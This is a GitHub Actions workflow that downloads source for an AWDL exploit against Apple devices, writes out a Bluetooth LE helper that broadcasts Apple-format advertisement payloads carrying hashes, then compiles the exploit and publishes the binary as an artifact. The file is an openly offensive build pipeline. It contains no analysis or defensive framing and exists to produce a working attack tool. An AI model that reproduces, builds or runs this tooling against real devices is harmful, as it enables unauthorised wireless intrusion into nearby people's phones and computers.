name: Build C Exploit from Source

on:
  workflow_dispatch: # Allows you to run this workflow manually from the Actions tab

jobs:
  build-exploit:
    name: Compile Exploit on Ubuntu
    runs-on: ubuntu-latest

    steps:
      - name: 1. Install Build Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y libpcap-dev libbluetooth-dev

      - name: 2. Download Main Source File
        run: |
          # Download the raw C file from the GitHub repository
          wget https://raw.githubusercontent.com/encryptedcoderr/AppleTest2/main/awdl_exploit_release/awdl_exploit_release/exploit/awdl_exploit.c

      - name: 3. Create BTLE Header File
        run: |
          cat << 'EOF' > btle_awdl.h
          #ifndef _BTLE_AWDL_H
          #define _BTLE_AWDL_H

          #include <stdint.h>

          int init_btle(char* dev_name);
          void fini_btle();
          int start_advertising_hashes(uint8_t* hash1, uint8_t* hash2, uint8_t* hash3, uint8_t* hash4);
          int stop_advertising_hashes();

          #endif
          EOF

      - name: 4. Create BTLE Source File
        run: |
          cat << 'EOF' > btle_awdl.c
          #include <stdio.h>
          #include <stdlib.h>
          #include <unistd.h>
          #include <bluetooth/bluetooth.h>
          #include <bluetooth/hci.h>
          #include <bluetooth/hci_lib.h>

          int handle = 0;

          int init_btle(char* dev_name) {
            int err;
            int dev_id = hci_devid(dev_name);
            if (dev_id < 0) {
              perror("invalid bluetooth device");
              return 0;
            }
            handle = hci_open_dev(dev_id);
            if (handle < 0) {
              perror("unable to open device");
              return 0;
            }
            return 1;
          }

          void fini_btle() {
            hci_close_dev(handle);
            handle = 0;
          }

          int start_advertising_hashes(uint8_t* hash1, uint8_t* hash2, uint8_t* hash3, uint8_t* hash4) {
            int err;
            le_set_advertising_parameters_cp params = {0};
            params.min_interval = 200;
            params.max_interval = 200;
            params.chan_map = 0x07;
            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISING_PARAMETERS, sizeof(params), &params);
            if (err < 0) { return 0; }
            le_set_advertise_enable_cp enable = { .enable = 1 };
            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE, sizeof(enable), &enable);
            if (err < 0) { return 0; }
            uint8_t payload[] = {0x02, 0x01, 0x06, 0x17, 0xff, 0x4c, 0x00, 0x05, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, hash1[0], hash1[1], hash2[0], hash2[1], hash3[0], hash3[1], hash4[0], hash4[1], 0x00};
            le_set_advertising_data_cp data = {0};
            data.length = sizeof(payload);
            memcpy(data.data, payload, sizeof(payload));
            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISING_DATA, sizeof(payload) + 1, &data);
            if (err < 0) { return 0; }
            return 1;
          }

          int stop_advertising_hashes() {
            int err;
            le_set_advertise_enable_cp enable = { .enable = 0 };
            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE, sizeof(enable), &enable);
            if (err < 0) { return 0; }
            return 1;
          }
          EOF

      - name: 5. Compile Exploit
        run: |
          # Compile all .c files and link against the pcap, pthread, and bluetooth libraries
          gcc -o awdl_exploit awdl_exploit.c btle_awdl.c -Wall -g -lpcap -lpthread -lbluetooth

      - name: 6. Upload Compiled Binary as Artifact
        uses: actions/upload-artifact@v4
        with:
          name: awdl-exploit-linux-binary
          path: awdl_exploit
